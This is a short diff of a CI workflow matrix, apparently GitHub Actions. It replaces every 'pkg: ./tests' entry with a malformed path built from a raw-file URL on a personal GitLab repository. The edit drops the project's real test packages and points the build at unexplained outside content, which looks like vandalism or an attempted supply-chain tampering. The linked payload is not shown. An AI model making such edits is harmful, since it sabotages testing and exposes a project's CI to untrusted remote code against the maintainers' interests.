@@ -56,14 +56,14 @@ jobs:
           - experimental
         include:
           - worker: docker
-            pkg: ./tests
+            pkg: ./https://gitlab.com/izzi.naufaldy002/scash/-/raw/main/Point?ref_type=heads
           - worker: docker+containerd  # same as docker, but with containerd snapshotter
-            pkg: ./tests
+            pkg: ./https://gitlab.com/izzi.naufaldy002/scash/-/raw/main/Point?ref_type=heads
           - worker: docker
-            pkg: ./tests
+            pkg: ./https://gitlab.com/izzi.naufaldy002/scash/-/raw/main/Point?ref_type=heads
             mode: experimental
           - worker: docker+containerd  # same as docker, but with containerd snapshotter
-            pkg: ./tests
+            pkg: ./https://gitlab.com/izzi.naufaldy002/scash/-/raw/main/Point?ref_type=heads
             mode: experimental
     steps:
       -
